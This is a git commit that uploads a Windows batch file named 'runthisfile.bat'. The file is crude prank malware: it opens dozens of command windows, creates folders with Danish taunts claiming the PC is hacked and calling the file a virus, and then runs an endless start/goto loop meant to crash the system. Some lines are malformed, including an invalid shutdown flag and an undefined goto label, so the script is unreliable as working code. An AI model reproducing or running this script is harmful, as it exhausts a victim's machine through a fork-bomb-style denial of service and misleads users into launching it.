5d6120263445c865b4517d6953998deb6712a400
O6M2L9XQ3P <91325239+O6M2L9XQ3P@users.noreply.github.com>
2021-09-24 22:33:24 +0200

    Add files via upload

---
+++ runthisfile.bat
@@ -0,0 +1,37 @@
+start mkdir 14
+start cmd.exe
+start mkdir 15
+start cmd.exe
+start mkdir 16
+start cmd.exe
+start mkdir 17
+start cmd.exe
+start mkdir 18
+start cmd.exe
+start mkdir 19
+start cmd.exe
+start mkdir 20
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+mkdir you got hacket
+mkdir R.I.P din pc
+mkdir slukker din pc
+mkdir jeg smadrer dit net
+mkdir bol din mor
+mkdir O6M2L9XQ3P,s virus
+mkdir skidt på
+@echo off
+: crash
+start
+goto crash
+shutdown /1
+goto loopstart
+:loopend
